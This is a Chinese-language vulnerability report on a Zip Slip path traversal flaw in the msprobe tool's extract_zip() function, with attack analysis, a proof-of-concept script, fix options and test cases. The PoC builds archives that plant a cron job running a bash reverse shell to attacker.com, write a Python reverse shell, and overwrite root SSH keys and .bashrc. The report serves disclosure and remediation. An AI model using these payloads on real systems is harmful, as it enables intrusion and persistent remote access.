# VULN-001: Zip Slip 路径遍历漏洞分析报告

## 漏洞概述

| 属性 | 值 |
|------|-----|
| 漏洞 ID | VULN-001-zip-slip-extract_zip |
| CWE | CWE-22 (Path Traversal) |
| 严重性 | 高危 (High) |
| 置信度 | 95% (已确认) |
| 影响文件 | `python/msprobe/core/common/file_utils.py:980-1003` |
| 受影响函数 | `extract_zip()` |

### 漏洞描述

`extract_zip()` 函数在解压 ZIP 文件时，使用 `zipfile.extractall()` 方法而未对 ZIP 包内的文件名进行路径遍历字符（如 `../`）校验。攻击者可构造包含恶意文件名的 ZIP 文件，将文件写入预期解压目录之外的任意位置，实现任意文件写入或覆盖系统关键文件。

### 漏洞代码

```python
# python/msprobe/core/common/file_utils.py:980-1003
def extract_zip(zip_file_path, extract_dir):
    """
    Extract the contents of a ZIP archive to a specified directory.
    """
    check_file_suffix(zip_file_path, FileCheckConst.ZIP_SUFFIX)
    check_file_or_directory_path(zip_file_path)
    create_directory(extract_dir)
    try:
        proc_lock.acquire()
        check_zip_file(zip_file_path)  # 仅检查文件大小和数量，不检查路径遍历
    except Exception as e:
        logger.error(f'Save content to file "{os.path.basename(zip_file_path)}" failed.')
        raise RuntimeError(f"Save content to file {os.path.basename(zip_file_path)} failed.") from e
    finally:
        proc_lock.release()
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
            zip_file.extractall(extract_dir)  # <-- 漏洞点！未检查文件名路径遍历
    except Exception as e:
        raise RuntimeError(f"extract zip file {os.path.basename(zip_file_path)} failed") from e
    recursive_chmod(extract_dir)
```

### 缺失的安全检查

`check_zip_file()` 函数仅检查：
- 文件数量限制 (`MAX_FILE_IN_ZIP_SIZE`)
- 单个文件大小限制 (`MAX_FILE_SIZE`)
- 总解压大小限制 (`MAX_ZIP_SIZE`)

**未检查的内容**：
- 文件名中是否包含路径遍历字符（`../`、`..\\`）
- 文件名是否使用绝对路径（如 `/etc/passwd`、`C:\Windows\System32\`）
- 符号链接是否指向目标目录之外

---

## 攻击场景分析

### 数据流路径

```
CLI Interface (config_check_cli.py)
    │
    ├── msprobe -c malicious.zip benign.zip -o /tmp/output
    │
    ▼
ConfigChecker.compare(bench_zip_path, cmp_zip_path, output_path)
    │
    │  config_checker.py:46-53
    │
    ├── extract_zip(bench_zip_path, bench_dir)  // bench_zip_path 可控
    │   │
    │   └── zipfile.extractall(extract_dir)  // 漏洞触发点
    │
    └── extract_zip(cmp_zip_path, cmp_dir)  // cmp_zip_path 可控
        │
        └── zipfile.extractall(extract_dir)  // 漏洞触发点
```

### 攻击入口点

| 入口点 | 文件 | 可控参数 | 信任级别 |
|--------|------|----------|----------|
| CLI 命令行 | `config_check_cli.py` | `-c` 参数 (zip 文件路径) | untrusted_local |

### 攻击步骤

1. **攻击者准备恶意 ZIP 文件**
   - 构造包含路径遍历文件名的 ZIP 文件
   - 例如：`../../../etc/cron.d/malicious` 或 `../../../../root/.ssh/authorized_keys`

2. **诱导用户执行配置比对命令**
   ```bash
   msprobe -c malicious.zip benign.zip -o /tmp/output
   ```

3. **漏洞触发**
   - `extract_zip()` 解压 `malicious.zip`
   - `extractall()` 不验证文件名，直接写入文件
   - 恶意文件被写入到 `/etc/cron.d/malicious` 或 `/root/.ssh/authorized_keys`

4. **攻击结果**
   - 覆盖系统关键配置文件
   - 注入定时任务获取持久化访问
   - 覆盖 SSH 密钥实现远程登录
   - 覆盖应用程序配置文件

---

## PoC 构造思路

### 构造恶意 ZIP 文件

```python
#!/usr/bin/env python3
"""
PoC: 构造用于测试 Zip Slip 漏洞的恶意 ZIP 文件
"""
import zipfile
import os

def create_malicious_zip(output_path, target_file="../../../tmp/pwned.txt", content="This file was written via Zip Slip vulnerability\n"):
    """
    创建包含路径遍历文件名的恶意 ZIP 文件
    
    Args:
        output_path: 生成的 ZIP 文件路径
        target_file: 包含路径遍历的目标文件名
        content: 要写入的文件内容
    """
    with zipfile.ZipFile(output_path, 'w') as zf:
        # 方法 1: 使用 ZipInfo 添加带路径遍历的文件
        # zip_info = zipfile.ZipInfo(target_file)
        # zf.writestr(zip_info, content)
        
        # 方法 2: 直接写入（zipfile 会保留文件名中的路径遍历字符）
        zf.writestr(target_file, content)
        
    print(f"[+] Created malicious ZIP: {output_path}")
    print(f"[+] Target path in ZIP: {target_file}")
    print(f"[+] Content: {content}")

# 示例：构造多个攻击场景
def create_advanced_malicious_zip(output_path):
    """构造高级攻击场景的恶意 ZIP"""
    with zipfile.ZipFile(output_path, 'w') as zf:
        # 场景 1: 覆盖用户 shell 配置文件
        zf.writestr("../../../home/user/.bashrc", "malicious_alias='echo pwned'\n")
        
        # 场景 2: 注入定时任务
        zf.writestr("../../../etc/cron.d/malicious_cron", "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\n")
        
        # 场景 3: 覆盖 SSH 授权密钥
        zf.writestr("../../../../root/.ssh/authorized_keys", "ssh-rsa AAAAB3... attacker@malicious.com\n")
        
        # 场景 4: 写入 Python 反弹 shell 脚本
        zf.writestr("../../../tmp/reverse_shell.py", "#!/usr/bin/env python3\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('attacker.com',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(['/bin/sh','-i'])\n")
        
        # 正常文件（用于混淆）
        zf.writestr("config.json", '{"name": "legitimate config"}\n')

if __name__ == "__main__":
    # 创建基础 PoC
    create_malicious_zip("malicious_bench.zip", 
                         target_file="../../../../../tmp/pwned_bench.txt",
                         content="Written from bench.zip via Zip Slip\n")
    
    create_malicious_zip("malicious_cmp.zip",
                         target_file="../../../../../tmp/pwned_cmp.txt", 
                         content="Written from cmp.zip via Zip Slip\n")
    
    # 创建高级 PoC
    create_advanced_malicious_zip("advanced_malicious.zip")
    
    print("\n[!] To exploit, run:")
    print("    msprobe -c malicious_bench.zip malicious_cmp.zip -o /tmp/output")
```

### 验证漏洞存在

```bash
# 1. 创建 PoC 文件
python3 poc_zip_slip.py

# 2. 执行易受攻击的命令
msprobe -c malicious_bench.zip malicious_cmp.zip -o /tmp/output

# 3. 检查是否成功写入预期目录之外
cat /tmp/pwned_bench.txt
cat /tmp/pwned_cmp.txt
```

### Windows 平台攻击向量

```python
# Windows 路径遍历示例
zf.writestr("..\\..\\..\\Windows\\System32\\config\\恶意文件", "content")
zf.writestr("C:\\Users\\Public\\Desktop\\malicious.exe", "PE content")
```

---

## 影响范围

### 受影响代码路径

| 文件 | 行号 | 函数 | 风险级别 |
|------|------|------|----------|
| `python/msprobe/core/common/file_utils.py` | 980-1003 | `extract_zip()` | **高危** |
| `python/msprobe/core/config_check/config_checker.py` | 50, 52 | `ConfigChecker.compare()` | 调用者 |
| `python/msprobe/core/config_check/config_check_cli.py` | 43 | `compare()` | 入口点 |

### 影响版本

所有使用 `msprobe` 工具进行配置检查比对的版本。

### 攻击前提条件

1. 攻击者需要能够控制或诱导用户使用恶意 ZIP 文件
2. 用户需要执行 `msprobe -c` 命令比对配置
3. 用户运行进程需要有写入目标文件的权限

### 潜在影响

| 影响类型 | 描述 |
|----------|------|
| **任意文件写入** | 可在文件系统任意位置创建文件 |
| **敏感文件覆盖** | 覆盖 `/etc/passwd`、`.ssh/authorized_keys`、`.bashrc` 等 |
| **远程代码执行** | 注入 cron 任务、覆盖脚本文件 |
| **权限提升** | 覆盖 SUID 程序、sudo 配置 |
| **数据泄露/篡改** | 覆盖配置文件、注入恶意配置 |

---

## 修复建议

### 方案 1: 在 `extract_zip()` 中添加路径遍历检查（推荐）

```python
def extract_zip(zip_file_path, extract_dir):
    """
    Extract the contents of a ZIP archive to a specified directory.
    """
    check_file_suffix(zip_file_path, FileCheckConst.ZIP_SUFFIX)
    check_file_or_directory_path(zip_file_path)
    create_directory(extract_dir)
    
    # 规范化解压目标路径
    extract_dir = os.path.realpath(extract_dir)
    
    try:
        proc_lock.acquire()
        check_zip_file(zip_file_path)
    except Exception as e:
        logger.error(f'Save content to file "{os.path.basename(zip_file_path)}" failed.')
        raise RuntimeError(f"Save content to file {os.path.basename(zip_file_path)} failed.") from e
    finally:
        proc_lock.release()
    
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
            # 添加路径遍历检查
            for member in zip_file.namelist():
                member_path = os.path.realpath(os.path.join(extract_dir, member))
                if not member_path.startswith(extract_dir + os.sep) and member_path != extract_dir:
                    raise ValueError(f"Attempted path traversal in ZIP file: {member}")
            
            # 安全解压
            zip_file.extractall(extract_dir)
    except Exception as e:
        raise RuntimeError(f"extract zip file {os.path.basename(zip_file_path)} failed") from e
    
    recursive_chmod(extract_dir)
```

### 方案 2: 修改 `check_zip_file()` 增加路径安全检查

```python
def check_zip_file(zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        total_size = 0
        if len(zip_file.infolist()) > FileCheckConst.MAX_FILE_IN_ZIP_SIZE:
            raise ValueError(f"Too many files in {os.path.basename(zip_file_path)}")
        
        for file_info in zip_file.infolist():
            # 新增：检查文件大小
            if file_info.file_size > FileCheckConst.MAX_FILE_SIZE:
                raise ValueError(f"File {file_info.filename} is too large to extract")
            
            # 新增：检查路径遍历
            filename = file_info.filename
            if filename.startswith('/') or '..' in filename.split(os.sep):
                raise ValueError(f"Unsafe path in ZIP file: {filename}")
            
            # 新增：检查绝对路径（Windows）
            if os.path.isabs(filename):
                raise ValueError(f"Absolute path not allowed in ZIP file: {filename}")
            
            # 新增：检查符号链接
            if file_info.is_dir():
                continue
            # 某些 ZIP 实现可能包含符号链接，需进一步检查
            
            total_size += file_info.file_size
            if total_size > FileCheckConst.MAX_ZIP_SIZE:
                raise ValueError(f"Total extracted size exceeds the limit of {FileCheckConst.MAX_ZIP_SIZE} bytes")
```

### 方案 3: 使用安全的解压方法

```python
def extract_zip(zip_file_path, extract_dir):
    """
    Extract the contents of a ZIP archive to a specified directory.
    """
    check_file_suffix(zip_file_path, FileCheckConst.ZIP_SUFFIX)
    check_file_or_directory_path(zip_file_path)
    create_directory(extract_dir)
    
    extract_dir = os.path.realpath(extract_dir)
    
    try:
        proc_lock.acquire()
        check_zip_file(zip_file_path)
    except Exception as e:
        logger.error(f'Save content to file "{os.path.basename(zip_file_path)}" failed.')
        raise RuntimeError(f"Save content to file {os.path.basename(zip_file_path)} failed.") from e
    finally:
        proc_lock.release()
    
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
            for member in zip_file.infolist():
                # 解析目标路径
                member_path = os.path.realpath(os.path.join(extract_dir, member.filename))
                
                # 验证路径在目标目录内
                if not member_path.startswith(extract_dir + os.sep):
                    logger.warning(f"Skipping unsafe path: {member.filename}")
                    continue
                
                # 安全创建目录和文件
                if member.is_dir():
                    os.makedirs(member_path, exist_ok=True)
                else:
                    os.makedirs(os.path.dirname(member_path), exist_ok=True)
                    with open(member_path, 'wb') as f:
                        f.write(zip_file.read(member))
    except Exception as e:
        raise RuntimeError(f"extract zip file {os.path.basename(zip_file_path)} failed") from e
    
    recursive_chmod(extract_dir)
```

### 最佳实践建议

1. **输入验证**：始终验证 ZIP 内文件名不包含路径遍历字符
2. **路径规范化**：使用 `os.path.realpath()` 获取绝对路径后再比较
3. **白名单机制**：如果可能，仅允许解压特定类型/路径的文件
4. **最小权限原则**：以最小必要权限运行解压进程
5. **审计日志**：记录解压操作，便于事后追踪

---

## 参考链接

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability)
- [Python zipfile 文档](https://docs.python.org/3/library/zipfile.html)
- [GitHub Security Lab: Zip Slip](https://securitylab.github.com/research/zip-slip-vulnerability)

---

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-04-20 | 漏洞发现并确认 |
| 2026-04-20 | 完成详细分析报告 |

---

## 附录：测试用例建议

```python
# test_file_utils.py 中应添加的测试用例

def test_extract_zip_path_traversal_attack(self):
    """测试 Zip Slip 路径遍历攻击防护"""
    import zipfile
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        zip_path = os.path.join(tmpdir, "malicious.zip")
        extract_dir = os.path.join(tmpdir, "extract")
        
        # 创建包含路径遍历的恶意 ZIP
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("../../../tmp/pwned.txt", "malicious content")
        
        # 应该抛出异常而不是解压到预期目录外
        with pytest.raises((ValueError, RuntimeError)):
            extract_zip(zip_path, extract_dir)
        
        # 验证文件没有被写入预期目录外
        assert not os.path.exists("/tmp/pwned.txt")

def test_extract_zip_absolute_path_attack(self):
    """测试绝对路径攻击防护"""
    import zipfile
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        zip_path = os.path.join(tmpdir, "malicious.zip")
        extract_dir = os.path.join(tmpdir, "extract")
        
        # 创建包含绝对路径的恶意 ZIP
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("/tmp/absolute_path.txt", "malicious content")
        
        with pytest.raises((ValueError, RuntimeError)):
            extract_zip(zip_path, extract_dir)

def test_extract_zip_normal_files(self):
    """测试正常文件解压不受影响"""
    import zipfile
    import tempfile
    
    with tempfile.TemporaryDirectory() as tmpdir:
        zip_path = os.path.join(tmpdir, "normal.zip")
        extract_dir = os.path.join(tmpdir, "extract")
        
        # 创建正常的 ZIP 文件
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr("config.json", '{"name": "test"}')
            zf.writestr("data/nested.txt", "nested content")
        
        # 正常解压应该成功
        extract_zip(zip_path, extract_dir)
        
        assert os.path.exists(os.path.join(extract_dir, "config.json"))
        assert os.path.exists(os.path.join(extract_dir, "data/nested.txt"))
```
